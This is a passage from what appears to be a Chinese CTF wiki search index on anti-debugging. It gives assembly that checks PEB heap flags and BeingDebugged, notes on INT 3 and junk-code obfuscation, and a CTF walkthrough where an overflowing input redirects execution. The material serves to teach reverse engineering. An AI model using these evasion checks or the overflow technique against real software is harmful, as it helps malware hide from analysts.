;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov ah , 10 h mov ebx , [ ebx + eax ] ;get process heap base sbb eax , eax and al , 0 a4h ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ ebx + eax + 74 h ], 40000060 h je being_debugged \u53c2\u8003\u94fe\u63a5 \u00b6 The \"Ultimate\" Anti-Debugging Reference","title":"Heap Flags"},{"location":"reverse/anti-debug/heap-flags/#heap-flags","text":"Heap flags \u5305\u542b\u6709\u4e24\u4e2a\u4e0e NtGlobalFlag \u4e00\u8d77\u521d\u59cb\u5316\u7684\u6807\u5fd7: Flags \u548c ForceFlags . \u8fd9\u4e24\u4e2a\u5b57\u6bb5\u7684\u503c\u4e0d\u4ec5\u4f1a\u53d7\u8c03\u8bd5\u5668\u7684\u5f71\u54cd, \u8fd8\u4f1a\u7531windows\u7248\u672c\u800c\u4e0d\u540c, \u5b57\u6bb5\u7684\u4f4d\u7f6e\u4e5f\u53d6\u51b3\u4e8ewindows\u7684\u7248\u672c. Flags\u5b57\u6bb5: \u572832\u4f4dWindows NT, Windows 2000\u548cWindows XP\u4e2d, Flags \u4f4d\u4e8e\u5806\u7684 0x0C \u504f\u79fb\u5904. \u572832\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u4f4d\u4e8e 0x40 \u504f\u79fb\u5904. \u572864\u4f4dWindows XP\u4e2d, Flags \u5b57\u6bb5\u4f4d\u4e8e\u5806\u7684 0x14 \u504f\u79fb\u5904, \u800c\u572864\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u5219\u662f\u4f4d\u4e8e 0x70 \u504f\u79fb\u5904. ForceFlags\u5b57\u6bb5: \u572832\u4f4dWindows NT, Windows 2000\u548cWindows XP\u4e2d, ForceFlags \u4f4d\u4e8e\u5806\u7684 0x10 \u504f\u79fb\u5904. \u572832\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u4f4d\u4e8e 0x44 \u504f\u79fb\u5904. \u572864\u4f4dWindows XP\u4e2d, ForceFlags \u5b57\u6bb5\u4f4d\u4e8e\u5806\u7684 0x18 \u504f\u79fb\u5904, \u800c\u572864\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u5219\u662f\u4f4d\u4e8e 0x74 \u504f\u79fb\u5904. \u5728\u6240\u6709\u7248\u672c\u7684Windows\u4e2d, Flags \u5b57\u6bb5\u7684\u503c\u6b63\u5e38\u60c5\u51b5\u90fd\u8bbe\u4e3a HEAP_GROWABLE(2) , \u800c ForceFlags \u5b57\u6bb5\u6b63\u5e38\u60c5\u51b5\u90fd\u8bbe\u4e3a 0 . \u7136\u800c\u5bf9\u4e8e\u4e00\u4e2a32\u4f4d\u8fdb\u7a0b(64\u4f4d\u7a0b\u5e8f\u4e0d\u4f1a\u6709\u6b64\u56f0\u6270), \u8fd9\u4e24\u4e2a\u9ed8\u8ba4\u503c, \u90fd\u53d6\u51b3\u4e8e\u5b83\u7684\u5bbf\u4e3b\u8fdb\u7a0b(host process)\u7684 subsystem \u7248\u672c(\u8fd9\u91cc\u4e0d\u662f\u6307\u6240\u8bf4\u7684\u6bd4\u5982win10\u7684linux\u5b50\u7cfb\u7edf). \u53ea\u6709\u5f53 subsystem \u5728 3.51 \u53ca\u66f4\u9ad8\u7684\u7248\u672c, \u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c\u624d\u5982\u524d\u6240\u8ff0. \u5982\u679c\u662f\u5728 3.10-3.50 \u7248\u672c\u4e4b\u95f4, \u5219\u4e24\u4e2a\u5b57\u6bb5\u7684 HEAP_CREATE_ALIGN_16 (0x10000) \u90fd\u4f1a\u88ab\u8bbe\u7f6e. \u5982\u679c\u7248\u672c\u4f4e\u4e8e 3.10 , \u90a3\u4e48\u8fd9\u4e2a\u7a0b\u5e8f\u6587\u4ef6\u5c31\u6839\u672c\u4e0d\u4f1a\u88ab\u8fd0\u884c. \u5982\u679c\u67d0\u64cd\u4f5c\u5c06 Flags \u548c ForgeFlags \u5b57\u6bb5\u7684\u503c\u5206\u522b\u8bbe\u4e3a 2 \u548c 0 , \u4f46\u662f\u5374\u672a\u5bf9 subsystem \u7248\u672c\u8fdb\u884c\u68c0\u67e5, \u90a3\u4e48\u5c31\u53ef\u4ee5\u8868\u660e\u8be5\u52a8\u4f5c\u662f\u4e3a\u4e86\u9690\u85cf\u8c03\u8bd5\u5668\u800c\u8fdb\u884c\u7684. \u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, \u5728 Windows NT , Windows 2000 \u548c32\u4f4d Windows XP \u7cfb\u7edf\u4e0b, Flags \u5b57\u6bb5\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7: HEAP_GROWABLE ( 2 ) HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_SKIP_VALIDATION_CHECKS ( 0x10000000 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) \u572864\u4f4d Windows XP \u7cfb\u7edf, Windows Vista \u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u7248\u672c, Flags \u5b57\u6bb5\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7(\u5c11\u4e86 HEAP_SKIP_VALIDATION_CHECKS (0x10000000) ): HEAP_GROWABLE ( 2 ) HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) \u800c\u5bf9\u4e8e ForgeFlags \u5b57\u6bb5, \u6b63\u5e38\u60c5\u51b5\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7: HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) \u56e0\u4e3a NtGlobalFlag \u6807\u5fd7\u7684\u5173\u7cfb, heap \u4e5f\u4f1a\u8bbe\u7f6e\u4e00\u4e9b\u6807\u5fd7\u4f4d \u5982\u679c\u5728 NtGlobalFlag \u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e FLG_HEAP_ENABLE_TAIL_CHECK \u6807\u5fd7, \u90a3\u4e48\u5728 heap \u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e HEAP_TAIL_CHECKING_ENABLED \u6807\u5fd7. \u5982\u679c\u5728 NtGlobalFlag \u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e FLG_HEAP_ENABLE_FREE_CHECK \u6807\u5fd7, \u90a3\u4e48\u5728 heap \u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e FLG_HEAP_ENABLE_FREE_CHECK \u6807\u5fd7. \u5982\u679c\u5728 NtGlobalFlag \u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e FLG_HEAP_VALIDATE_PARAMETERS \u6807\u5fd7, \u90a3\u4e48\u5728 heap \u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e HEAP_VALIDATE_PARAMETERS_ENABLED \u6807\u5fd7(\u5728 Windows NT \u548c Windows 2000 \u4e2d\u8fd8\u4f1a\u8bbe\u7f6e HEAP_CREATE_ALIGN_16 (0x10000) \u6807\u5fd7). heap flags \u540c\u6837\u4e5f\u5982\u4e0a\u8282\u7684 NtGlobalFlag \u90a3\u6837, \u4e0d\u8fc7\u5b83\u53d7\u5230\u6ce8\u518c\u8868 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<filename> \u4f4d\u7f6e\u7684 PageHeapFlags\" \u952e\u7684\u63a7\u5236.","title":"\u5173\u4e8eHeap flags"},{"location":"reverse/anti-debug/heap-flags/#heap","text":"\u6709\u591a\u79cd\u65b9\u6cd5\u80fd\u83b7\u77e5 heap \u7684\u4f4d\u7f6e, \u65b9\u6cd5\u4e4b\u4e00\u5c31\u662f kernel32 \u7684 GetProcessHeap() \u51fd\u6570, \u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b\u768432\u4f4d\u6c47\u7f16\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883(\u5b9e\u9645\u4e0a\u5c31\u6709\u4e00\u4e9b\u58f3\u907f\u514d\u4f7f\u7528\u8be5api\u51fd\u6570, \u76f4\u63a5\u67e5\u8be2PEB): mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base \u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b64\u4f4d\u73af\u5883 push 60 h pop rsi gs: lodsq ;Process Environment Block mov eax , [ rax + 30 h ] ;get process heap base \u6216\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883 mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov eax , [ eax + 1030 h ] ;get process heap base \u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u4f7f\u7528 kernel32 \u7684 GetProcessHeaps() \u51fd\u6570, \u5176\u5b9e\u5b83\u53ea\u662f\u7b80\u5355\u7684\u8f6c\u7ed9\u4e86 ntdll \u7684 RtlGetProcessHeaps() \u51fd\u6570, \u8fd9\u4e2a\u51fd\u6570\u4f1a\u8fd4\u56de\u5c5e\u4e8e\u5f53\u524d\u8fdb\u7a0b\u7684\u5806\u7684\u6570\u7ec4, \u800c\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5806, \u5c31\u8ddf kernel32 \u7684 GetProcessHeap() \u51fd\u6570\u6240\u8fd4\u56de\u7684\u662f\u4e00\u6837\u7684. \u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883\u6765\u5b9e\u73b0: push 30 h pop esi fs: lodsd ;Process Environment Block ;get process heaps list base mov esi , [ esi + eax + 5 ch ] lodsd \u540c\u4e0a, \u752864\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883\u7684\u4ee3\u7801\u662f: push 60 h pop rsi gs: lodsq ;Process Environment Block ;get process heaps list base mov esi , [ rsi * 2 + rax + 20 h ] lodsd \u6216\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindow\u73af\u5883: mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov esi , [ eax + 10 f0h ] ;get process heaps list base lodsd","title":"\u83b7\u53d6heap\u4f4d\u7f6e"},{"location":"reverse/anti-debug/heap-flags/#flags","text":"\u90a3\u4e48\u663e\u7136, \u68c0\u6d4b\u8c03\u8bd5\u5668\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece\u68c0\u6d4b\u90a3\u51e0\u4e2a Flags \u548c ForgeFlags \u7684\u6807\u5fd7\u4f4d\u5165\u624b. \u5148\u770b Flags \u5b57\u6bb5\u7684\u68c0\u6d4b\u4ee3\u7801, \u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14 subsystem \u7248\u672c\u5728 3.10-3.50 \u4e4b\u95f4: call GetVersion cmp al , 6 cmc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 0 ch ] ;Flags ;neither HEAP_CREATE_ALIGN_16 ;nor HEAP_SKIP_VALIDATION_CHECKS and eax , 0 effeffffh ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp eax , 40000062 h je being_debugged 32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14 subsystem \u4e3a 3.51 \u53ca\u66f4\u9ad8\u7248\u672c: call GetVersion cmp al , 6 cmc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 0 ch ] ;Flags ;not HEAP_SKIP_VALIDATION_CHECKS bswap eax and al , 0 efh ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED ;reversed by bswap cmp eax , 62000040 h je being_debugged 64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883(64\u4f4d\u8fdb\u7a0b\u4e0d\u5fc5\u53d7 subsystem \u7248\u672c\u56f0\u6270): push 60 h pop rsi gs: lodsq ;Process Environment Block mov ebx , [ rax + 30 h ] ;get process heap base call GetVersion cmp al , 6 sbb rax , rax and al , 0 a4h ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp d [ rbx + rax + 70 h ], 40000062 h ;Flags je being_debugged \u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883: push 30 h pop eax mov ebx , fs :[ eax ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov ah , 10 h mov ebx , [ ebx + eax ] ;get process heap base call GetVersion cmp al , 6 sbb eax , eax and al , 0 a4h ;Flags ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ ebx + eax + 70 h ], 40000062 h je being_debugged \u5982\u679c\u662f\u76f4\u63a5\u901a\u8fc7 KUSER_SHARED_DATA \u7ed3\u6784\u7684 NtMajorVersion \u5b57\u6bb5(\u4f4d\u4e8e2G\u7528\u6237\u7a7a\u95f4\u7684 0x7ffe026c \u504f\u79fb\u5904)\u83b7\u53d6\u8be5\u503c(\u5728\u6240\u670932\u4f4d/64\u4f4d\u7248\u672c\u7684Windows\u90fd\u53ef\u4ee5\u83b7\u53d6\u8be5\u503c), \u53ef\u4ee5\u8fdb\u4e00\u6b65\u6df7\u6dc6 kernel32 \u7684 GetVersion() \u51fd\u6570\u8c03\u7528\u64cd\u4f5c.","title":"\u68c0\u6d4bFlags\u5b57\u6bb5"},{"location":"reverse/anti-debug/heap-flags/#forgeflags","text":"\u5f53\u7136\u53e6\u4e00\u4e2a\u65b9\u6cd5\u5c31\u662f\u68c0\u6d4b ForgeFlags \u5b57\u6bb5, \u4ee5\u4e0b\u662f32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dWindows\u73af\u5883, subsystem \u7248\u672c\u5728 3.10-3.50 \u4e4b\u95f4: call GetVersion cmp al , 6 cmc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 10 h ] ;ForceFlags ;not HEAP_CREATE_ALIGN_16 btr eax , 10 h ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp eax , 40000060 h je being_debugged 32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14 subsystem \u4e3a 3.51 \u53ca\u66f4\u9ad8\u7248\u672c: call GetVersion cmp al , 6 cmc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ eax + ebx + 10 h ], 40000060 h je being_debugged 64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883(64\u4f4d\u8fdb\u7a0b\u4e0d\u5fc5\u53d7 subsystem \u7248\u672c\u56f0\u6270): push 60 h pop rsi gs: lodsq ;Process Environment Block mov ebx , [ rax + 30 h ] ;get process heap base call GetVersion cmp al , 6 sbb rax , rax and al , 0 a4h ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp d [ rbx + rax + 74 h ], 40000060 h je being_debugged \u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883: call GetVersion cmp al , 6 push 30 h pop eax mov ebx , fs :[ eax ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov ah , 10 h mov ebx , [ ebx + eax ] ;get process heap base sbb eax , eax and al , 0 a4h ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ ebx + eax + 74 h ], 40000060 h je being_debugged","title":"\u68c0\u6d4bForgeFlags\u5b57\u6bb5"},{"location":"reverse/anti-debug/heap-flags/#_1","text":"The \"Ultimate\" Anti-Debugging Reference","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"reverse/anti-debug/int-3/","text":"\u65e0\u8bba\u4f55\u65f6\u89e6\u53d1\u4e86\u4e00\u4e2a\u8f6f\u4ef6\u4e2d\u65ad\u5f02\u5e38, \u5f02\u5e38\u5730\u5740\u4ee5\u53caEIP\u5bc4\u5b58\u5668\u7684\u503c\u90fd\u4f1a\u540c\u65f6\u6307\u5411\u4ea7\u751f\u5f02\u5e38\u7684\u4e0b\u4e00\u53e5\u6307\u4ee4. \u4f46\u65ad\u70b9\u5f02\u5e38\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u7279\u4f8b. \u5f53 EXCEPTION_BREAKPOINT(0x80000003) \u5f02\u5e38\u89e6\u53d1\u65f6, Windows\u4f1a\u8ba4\u5b9a\u8fd9\u662f\u7531\u5355\u5b57\u8282\u7684\" CC \"\u64cd\u4f5c\u7801(\u4e5f\u5373 Int 3 \u6307\u4ee4)\u9020\u6210\u7684. Windows\u9012\u51cf\u5f02\u5e38\u5730\u5740\u4ee5\u6307\u5411\u6240\u8ba4\u5b9a\u7684\" CC \"\u64cd\u4f5c\u7801, \u968f\u540e\u4f20\u9012\u8be5\u5f02\u5e38\u7ed9\u5f02\u5e38\u5904\u7406\u53e5\u67c4. \u4f46\u662fEIP\u5bc4\u5b58\u5668\u7684\u503c\u5e76\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316. \u56e0\u6b64, \u5982\u679c\u4f7f\u7528\u4e86 CD 03 \uff08\u8fd9\u662f Int 03 \u7684\u673a\u5668\u7801\u8868\u793a\uff09\uff0c\u90a3\u4e48\u5f53\u5f02\u5e38\u5904\u7406\u53e5\u67c4\u63a5\u53d7\u63a7\u5236\u65f6, \u5f02\u5e38\u5730\u5740\u662f\u6307\u5411 03 \u7684\u4f4d\u7f6e.","title":"Interrupt 3"},{"location":"reverse/anti-debug/isdebuggerpresent/","text":"\u5173\u4e8eIsDebuggerPresent \u00b6 \u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, kernel32 \u7684 IsDebuggerPresent() \u51fd\u6570\u8fd4\u56de\u7684\u662f\u4e00\u4e2a \u975e0\u503c . BOOL WINAPI IsDebuggerPresent ( void ); \u68c0\u6d4b\u4ee3\u7801 \u00b6 \u5b83\u7684\u68c0\u6d4b\u65b9\u6cd5\u975e\u5e38\u7b80\u5355, \u6bd4\u5982\u7528\u4ee5\u4e0b\u4ee3\u7801(32\u4f4d\u8fd8\u662f64\u4f4d\u90fd\u662f\u76f8\u540c\u7684\u8fd9\u4efd\u4ee3\u7801)\u572832\u4f4d/64\u4f4d\u73af\u5883\u4e2d\u68c0\u6d4b: call IsDebuggerPresent test al , al jne being_debugged \u5b9e\u9645\u4e0a, \u8fd9\u4e2a\u51fd\u6570\u53ea\u662f\u5355\u7eaf\u5730\u8fd4\u56de\u4e86 BeingDebugged \u6807\u5fd7\u7684\u503c. \u68c0\u67e5 BeingDebugged \u6807\u5fd7\u4f4d\u7684\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4ee3\u7801\u4f4d\u4ee3\u7801\u68c0\u67e532\u4f4d\u73af\u5883\u6765\u5b9e\u73b0: mov eax , fs :[ 30 h ] ;Process Environment Block cmp b [ eax + 2 ], 0 ;check BeingDebugged jne being_debugged \u6216\u4f7f\u752864\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883 push 60 h pop rsi gs: lodsq ;Process Environment Block cmp b [ rax + 2 ], 0 ;check BeingDebugged jne being_debugged \u6216\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883 mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block cmp b [ eax + 1002 h ], 0 ;check BeingDebugged jne being_debugged \u5982\u4f55\u7ed5\u8fc7 \u00b6 \u60f3\u8981\u514b\u670d\u8fd9\u4e9b\u68c0\u6d4b, \u53ea\u9700\u8981\u5c06 BeingDebugged \u6807\u5fd7\u8bbe\u4e3a 0 \u5373\u53ef(\u6216\u6539\u53d8\u4e00\u4e0b\u8fd4\u56de\u503c).","title":"IsDebuggerPresent"},{"location":"reverse/anti-debug/isdebuggerpresent/#isdebuggerpresent","text":"\u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, kernel32 \u7684 IsDebuggerPresent() \u51fd\u6570\u8fd4\u56de\u7684\u662f\u4e00\u4e2a \u975e0\u503c . BOOL WINAPI IsDebuggerPresent ( void );","title":"\u5173\u4e8eIsDebuggerPresent"},{"location":"reverse/anti-debug/isdebuggerpresent/#_1","text":"\u5b83\u7684\u68c0\u6d4b\u65b9\u6cd5\u975e\u5e38\u7b80\u5355, \u6bd4\u5982\u7528\u4ee5\u4e0b\u4ee3\u7801(32\u4f4d\u8fd8\u662f64\u4f4d\u90fd\u662f\u76f8\u540c\u7684\u8fd9\u4efd\u4ee3\u7801)\u572832\u4f4d/64\u4f4d\u73af\u5883\u4e2d\u68c0\u6d4b: call IsDebuggerPresent test al , al jne being_debugged \u5b9e\u9645\u4e0a, \u8fd9\u4e2a\u51fd\u6570\u53ea\u662f\u5355\u7eaf\u5730\u8fd4\u56de\u4e86 BeingDebugged \u6807\u5fd7\u7684\u503c. \u68c0\u67e5 BeingDebugged \u6807\u5fd7\u4f4d\u7684\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4ee3\u7801\u4f4d\u4ee3\u7801\u68c0\u67e532\u4f4d\u73af\u5883\u6765\u5b9e\u73b0: mov eax , fs :[ 30 h ] ;Process Environment Block cmp b [ eax + 2 ], 0 ;check BeingDebugged jne being_debugged \u6216\u4f7f\u752864\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883 push 60 h pop rsi gs: lodsq ;Process Environment Block cmp b [ rax + 2 ], 0 ;check BeingDebugged jne being_debugged \u6216\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883 mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block cmp b [ eax + 1002 h ], 0 ;check BeingDebugged jne being_debugged","title":"\u68c0\u6d4b\u4ee3\u7801"},{"location":"reverse/anti-debug/isdebuggerpresent/#_2","text":"\u60f3\u8981\u514b\u670d\u8fd9\u4e9b\u68c0\u6d4b, \u53ea\u9700\u8981\u5c06 BeingDebugged \u6807\u5fd7\u8bbe\u4e3a 0 \u5373\u53ef(\u6216\u6539\u53d8\u4e00\u4e0b\u8fd4\u56de\u503c).","title":"\u5982\u4f55\u7ed5\u8fc7"},{"location":"reverse/anti-debug/junk-code/","text":"\u539f\u7406 \u00b6 \u82b1\u6307\u4ee4\u662f\u4f01\u56fe\u9690\u85cf\u6389\u4e0d\u60f3\u88ab\u9006\u5411\u5de5\u7a0b\u7684\u4ee3\u7801\u5757(\u6216\u5176\u5b83\u529f\u80fd)\u7684\u4e00\u79cd\u65b9\u6cd5, \u5728\u771f\u5b9e\u4ee3\u7801\u4e2d\u63d2\u5165\u4e00\u4e9b\u5783\u573e\u4ee3\u7801\u7684\u540c\u65f6\u8fd8\u4fdd\u8bc1\u539f\u6709\u7a0b\u5e8f\u7684\u6b63\u786e\u6267\u884c, \u800c\u7a0b\u5e8f\u65e0\u6cd5\u5f88\u597d\u5730\u53cd\u7f16\u8bd1, \u96be\u4ee5\u7406\u89e3\u7a0b\u5e8f\u5185\u5bb9, \u8fbe\u5230\u6df7\u6dc6\u89c6\u542c\u7684\u6548\u679c. \u4f8b\u9898 \u00b6 \u8fd9\u91cc\u4ee5 \u770b\u96ea.TSRC 2017CTF\u79cb\u5b63\u8d5b \u7b2c\u4e8c\u9898\u4f5c\u4e3a\u8bb2\u89e3. \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5: ctf2017_Fpc.exe \u7a0b\u5e8f\u5199\u4e86\u51e0\u4e2a\u51fd\u6570\u6df7\u6dc6\u89c6\u542c, \u5c06\u5173\u952e\u7684\u9a8c\u8bc1\u903b\u8f91\u52a0\u82b1\u6307\u4ee4\u9632\u6b62\u4e86IDA\u7684\u9759\u6001\u5206\u6790. \u6211\u4eec\u7528IDA\u6253\u5f00Fpc\u8fd9\u9053\u9898, \u7a0b\u5e8f\u4f1a\u5148\u6253\u5370\u4e00\u4e9b\u63d0\u793a\u4fe1\u606f, \u7136\u540e\u83b7\u53d6\u7528\u6237\u7684\u8f93\u5165. \u8fd9\u91cc\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684 scanf \u51fd\u6570, \u7528\u6237\u8f93\u5165\u7684\u7f13\u51b2\u533a\u53ea\u6709 0xCh \u957f, \u6211\u4eec\u53cc\u51fb v1 \u8fdb\u5165\u6808\u5e27\u89c6\u56fe \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fa\u6570\u636e, \u8986\u76d6\u6389\u8fd4\u56de\u5730\u5740, \u4ece\u800c\u8f6c\u79fb\u5230\u4efb\u610f\u5730\u5740\u7ee7\u7eed\u6267\u884c. \u8fd9\u91cc\u6211\u8fd8\u9700\u8981\u89e3\u91ca\u4e00\u4e0b, \u5c31\u662f scanf \u4e4b\u524d\u5199\u7684\u51e0\u4e2a\u6df7\u6dc6\u89c6\u542c\u7684\u51fd\u6570, \u662f\u4e00\u4e9b\u7b80\u5355\u7684\u65b9\u7a0b\u5f0f\u4f46\u5b9e\u9645\u4e0a\u662f\u65e0\u89e3\u7684. \u7a0b\u5e8f\u5c06\u771f\u6b63\u7684\u9a8c\u8bc1\u903b\u8f91\u52a0\u82b1\u6df7\u6dc6, \u5bfc\u81f4IDA\u65e0\u6cd5\u5f88\u597d\u7684\u8fdb\u884c\u53cd\u7f16\u8bd1. \u6240\u4ee5\u6211\u4eec\u8fd9\u9053\u9898\u7684\u601d\u8def\u5c31\u662f, \u901a\u8fc7\u6ea2\u51fa\u8f6c\u5230\u771f\u6b63\u7684\u9a8c\u8bc1\u4ee3\u7801\u5904\u7ee7\u7eed\u6267\u884c. \u6211\u4eec\u5728\u5206\u6790\u65f6\u53ef\u4ee5\u5728\u4ee3\u7801\u4e0d\u8fdc\u5904\u53d1\u73b0\u4ee5\u4e0b\u6570\u636e\u5757. \u56e0\u4e3aIDA\u6ca1\u80fd\u5f88\u597d\u7684\u8bc6\u522b\u6570\u636e, \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c06\u5149\u6807\u79fb\u5230\u6570\u636e\u5757\u7684\u8d77\u59cb\u4f4d\u7f6e, \u7136\u540e\u6309\u4e0b C \u952e(code)\u5c06\u8fd9\u5757\u6570\u636e\u53cd\u6c47\u7f16\u6210\u4ee3\u7801 \u503c\u5f97\u6ce8\u610f\u7684\u662f, \u8fd9\u6bb5\u4ee3\u7801\u7684\u4f4d\u7f6e\u662f 0x00413131 , 0x41 \u662f 'A' \u7684ascii\u7801\uff0c\u800c 0x31 \u662f '1' \u7684ascii\u7801. \u7531\u4e8e\u770b\u96ea\u6bd4\u8d5b\u7684\u9650\u5236, \u7528\u6237\u8f93\u5165\u53ea\u80fd\u662f\u5b57\u6bcd\u548c\u6570\u5b57, \u6240\u4ee5\u6211\u4eec\u4e5f\u5b8c\u5168\u53ef\u4ee5\u5229\u7528\u6ea2\u51fa\u6f0f\u6d1e\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801 \u7528OD\u6253\u5f00, \u7136\u540e Ctrl+G \u5230\u8fbe 0x413131 \u5904\u8bbe\u4e0b\u65ad\u70b9, \u8fd0\u884c\u540e\u8f93\u5165 12345612345611A \u56de\u8f66, \u7a0b\u5e8f\u6210\u529f\u5730\u5230\u8fbe 0x00413131 \u5904. \u7136\u540e \u53f3\u952e\u5206\u6790->\u4ece\u6a21\u5757\u4e2d\u5220\u9664\u5206\u6790 \u8bc6\u522b\u51fa\u6b63\u786e\u4ee3\u7801 \u65ad\u5728 0x413131 \u5904\u540e, 